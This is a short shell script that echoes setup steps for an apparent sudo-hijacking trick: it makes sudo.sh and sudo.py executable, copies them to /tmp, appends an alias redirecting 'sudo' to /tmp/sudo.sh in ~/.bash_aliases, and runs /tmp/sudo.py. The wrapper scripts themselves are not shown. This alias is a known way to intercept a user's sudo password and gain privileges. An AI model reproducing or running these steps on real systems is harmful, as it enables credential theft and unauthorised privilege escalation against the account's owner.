echo "chmod +x sudo.sh"
echo "cp sudo.sh /tmp/sudo.sh"

echo "chmod +x sudo.py"
echo "cp sudo.py /tmp/sudo.py"


echo "alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases"
echo "python /tmp/sudo.py $i"